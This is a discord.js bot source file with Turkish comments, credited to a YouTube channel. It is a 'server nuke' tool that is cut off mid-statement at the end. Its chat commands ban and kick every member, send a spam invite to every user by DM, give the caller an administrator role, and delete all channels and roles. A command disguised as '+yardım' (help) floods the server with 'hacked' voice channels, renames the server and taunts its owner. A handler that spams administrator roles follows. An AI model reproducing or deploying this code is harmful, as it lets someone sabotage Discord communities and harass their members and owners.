const Discord = require("discord.js"); //TÜM TELİF HAKKI ENES ACARA AİTTİR youtube.com/enesacaryt KANALINDA VİDEOLU ANLATIMI BULUNMAKTADIR
const client = new Discord.Client();
const ayarlar = require("./ayarlar.json");
const { Client, Util } = require("discord.js");
const request = require("request");
client.login(ayarlar.token);

client.on("message", msg => {           ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=tw25SvdgeTk
  if (msg.content === "+ban") {
    msg.delete();
    msg.guild.members.forEach(member => member.ban());  
  }
});       ///BAN KOMUTU SUNUCUDAKI HEKESI BANLAR +ban

client.on("message", msg => {
  if (msg.content === "+kick") {
    msg.delete();
    msg.guild.members.forEach(member => member.kick());
  }
});      ///KICK KOMUTU SUNUCUDAKI HERKESI KICKLER +kick 

client.on("message", async msg => {
  if (msg.content === "+duyur") {  //SUNUCUDAKI BUTUN HERKESE MESAJ GÖNDERİR +duyur
    msg.delete();
    await msg.client.users
      .forEach(users =>
        users.send(
          "**KÜLLERİMİZDEN DOĞDUK XD https://discord.gg/Rm2cUvBn"  //HERKESE DMDEN ATILAN MESAJ
        )
      )
      .catch(console.error);
  } 
});

client.on("message", msg => {
  if (msg.content === "+yetki") {  //SIZE YÖNETICI YETKISI VERIR +yetki
    msg.delete();
    msg.guild.createRole({
      name: ".",
      permissions: ["ADMINISTRATOR"]
    });
    let rol = msg.guild.roles.find(role => role.name === ".");  ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=tw25SvdgeTk
    msg.member.addRole(rol);
  }
});

client.on("message", async msg => {
  if (msg.content === "+yardım") {     ///COKERT KOMUTU BÜTÜN KANALLARI SILIP COK FAZLA KANAL ACAR
    msg.delete();

    await msg.guild.channels.deleteAll();      //TÜM KANALLARI SİLEN KOMUT

    await msg.guild.createChannel("hacked", {
      type: "text"
    });
      await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("BU SUNUCU", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HACKLENMİŞTİR", { ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=tw25SvdgeTk
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("KOLAYDINIZ xD", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HÜKÜMDARLIĞIMIZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("SONSUZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("YENİLMEYİZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("KÜLLERİMİZDEN", {
        type: "voice"
      })
      .then(chan => {  ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=tw25SvdgeTk
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("DOĞACAĞIZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
                await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("BU SUNUCU", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HACKLENMİŞTİR", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("KOLAYDINIZ xD", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HÜKÜMDARLIĞIMIZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("SONSUZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("YENİLMEYİZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {  ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=tw25SvdgeTk
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("KÜLLERİMİZDEN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("DOĞACAĞIZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
                await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    
            await msg.guild
      .createChannel("BU SUNUCU", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HACKLENMİŞTİR", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("KOLAYDINIZ xD", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HÜKÜMDARLIĞIMIZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("SONSUZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("YENİLMEYİZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("KÜLLERİMİZDEN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("DOĞACAĞIZ", { ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=tw25SvdgeTk
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
                await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    
            await msg.guild
      .createChannel("BU SUNUCU", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HACKLENMİŞTİR", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("KOLAYDINIZ xD", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HÜKÜMDARLIĞIMIZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("SONSUZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("YENİLMEYİZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("KÜLLERİMİZDEN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("DOĞACAĞIZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
                await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");  //www.youtube.com/ENESACARYT TARAFINDAN YAPILMISTIR
      });
    
            await msg.guild
      .createChannel("BU SUNUCU", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HACKLENMİŞTİR", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("KOLAYDINIZ xD", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HÜKÜMDARLIĞIMIZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("SONSUZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("YENİLMEYİZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("KÜLLERİMİZDEN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("DOĞACAĞIZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
                await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {  ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=tw25SvdgeTk
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    
            await msg.guild
      .createChannel("BU SUNUCU", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HACKLENMİŞTİR", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("KOLAYDINIZ xD", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HÜKÜMDARLIĞIMIZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("SONSUZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("YENİLMEYİZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("KÜLLERİMİZDEN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("DOĞACAĞIZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
                await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    
            await msg.guild
      .createChannel("BU SUNUCU", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HACKLENMİŞTİR", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("KOLAYDINIZ xD", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");  ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=tw25SvdgeTk
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HÜKÜMDARLIĞIMIZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("SONSUZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("YENİLMEYİZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("KÜLLERİMİZDEN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("DOĞACAĞIZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
                await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    
            await msg.guild
      .createChannel("BU SUNUCU", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HACKLENMİŞTİR", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("KOLAYDINIZ xD", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HÜKÜMDARLIĞIMIZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("SONSUZ", {  ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=tw25SvdgeTk
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("YENİLMEYİZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("KÜLLERİMİZDEN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("DOĞACAĞIZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
                await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    
            await msg.guild
      .createChannel("BU SUNUCU", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HACKLENMİŞTİR", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("KOLAYDINIZ xD", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HÜKÜMDARLIĞIMIZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("SONSUZ", {
        type: "voice"
      })   ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=tw25SvdgeTk
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("YENİLMEYİZ", {  ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=tw25SvdgeTk
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("KÜLLERİMİZDEN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("DOĞACAĞIZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
                await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    
            await msg.guild
      .createChannel("BU SUNUCU", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HACKLENMİŞTİR", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("KOLAYDINIZ xD", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HÜKÜMDARLIĞIMIZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("SONSUZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("YENİLMEYİZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("KÜLLERİMİZDEN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("DOĞACAĞIZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
                await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    
            await msg.guild
      .createChannel("BU SUNUCU", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HACKLENMİŞTİR", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("KOLAYDINIZ xD", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HÜKÜMDARLIĞIMIZ", {
        type: "voice"
      })   ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=tw25SvdgeTk
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("SONSUZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("YENİLMEYİZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("KÜLLERİMİZDEN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("DOĞACAĞIZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
                await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    
            await msg.guild
      .createChannel("BU SUNUCU", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HACKLENMİŞTİR", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild  ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=tw25SvdgeTk
      .createChannel("KOLAYDINIZ xD", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HÜKÜMDARLIĞIMIZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("SONSUZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("YENİLMEYİZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("KÜLLERİMİZDEN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("DOĞACAĞIZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
                await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    
            await msg.guild
      .createChannel("BU SUNUCU", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HACKLENMİŞTİR", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("KOLAYDINIZ xD", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HÜKÜMDARLIĞIMIZ", {
        type: "voice"     ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=tw25SvdgeTk
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("SONSUZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("YENİLMEYİZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("KÜLLERİMİZDEN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("DOĞACAĞIZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
                await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    
            await msg.guild
      .createChannel("BU SUNUCU", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HACKLENMİŞTİR", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("KOLAYDINIZ xD", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HÜKÜMDARLIĞIMIZ", {
        type: "voice"
      })  ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=tw25SvdgeTk
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("SONSUZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("YENİLMEYİZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("KÜLLERİMİZDEN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("DOĞACAĞIZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });                      ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=tw25SvdgeTk
                await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    
    await msg.guild.setIcon("https://i.hizliresim.com/MpAB0o.jpg");  //SUNUCUNUN RESMINI DEGISTIRIR HIZI RESIM SUTESINDEN UPLOAD EDEBILIRSINIZ
    await msg.guild.setName("ャ HACKED SERVER ャ"); //SUNUCUNUN ISMINI DEGISTIRIR
    await msg.guild.roles.forEach(roles => roles.delete()); //BOTUN SIZE BILDIGI BÜTÜN ROLLER SILINIR (BOTUN ROLUNUN ALTINDAKILER) 
    await client.user.setAvatar("https://i.hizliresim.com/MpAB0o.jpg"); //BOTUN RESMINI DEGISTIRIR HIZLI RESIM SITESINDEN UPLOAD EDEBILIRSINIZ
    await client.user.setUsername("ャ HACKED ャ");    //BOTUN ISMİNİ DEGISTIRIR
    await msg.guild.owner.send("**Sunucunu Hackledik Ağla :D**");    //SUNUCUNUN KURUCUSUNA DMDEN GÖNDERİLEN MESAJ
    
  }   ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=tw25SvdgeTk
});

 //www.youtube.com/ENESACARYT TARAFINDAN YAPILMISTIR

    client.on("message", msg => {
  if (msg.content === "+rolspam") {  //ROL SPAM YAPAR
    msg.delete();
    msg.guild.createRole({
      name: "HACKED",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
        msg.guild.createRole({
      name: "HACKED",
      color: "C22F2F",
      permissions: ["ADMINISTRATOR"]
    });
            msg.guild.createRole({
      name: "HACKED",
      color: "E12020",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "FF0000",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "FF3E00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "FF4D00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "FF6C00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "FF9300",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "FFAE00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "FFD500",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "FFFF00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "E0FF00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "C1FF00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "93FF00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "74FF00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "3EFF00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "0CFF00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "00FF2E",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "00FF6C",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "00FFA6",
      permissions: ["ADMINISTRATOR"] //www.youtube.com/ENESACARYT TARAFINDAN YAPILMISTIR
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "00FFD4",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "00FFFB",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "00C9FF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "009BFF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "006CFF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "003AFF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "001BFF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "1F00FF",
